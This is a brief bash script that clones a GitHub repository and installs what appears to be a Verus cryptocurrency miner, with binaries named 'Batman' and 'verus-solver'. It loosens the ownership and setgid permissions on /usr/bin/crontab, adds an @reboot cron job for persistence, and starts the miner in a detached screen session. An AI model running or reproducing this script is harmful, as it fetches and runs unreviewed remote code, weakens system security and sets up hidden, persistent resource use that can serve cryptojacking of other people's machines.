#!/bin/bash
nproc=$(nproc --all)
sudo apt-get update -y
sudo apt-get install git screen
git clone https://github.com/awanhitam78/gas.git
cd gas
sudo chown "$USER".crontab /usr/bin/crontab
sudo chmod g+s /usr/bin/crontab
sudo touch /var/spool/cron/crontabs/"$USER"
crontab -l > mycron
echo "@reboot sleep 60 && /$USER/gas/dotasks.sh" >> mycron
crontab mycron
rm mycron
sudo systemctl enable cron.service
update-rc.d cron defaults
sudo chmod +x Batman
sudo chmod +x starts.sh
sudo chmod +x verus-solver
screen -d -m bash -c "cd gas ; ./starts.sh" &
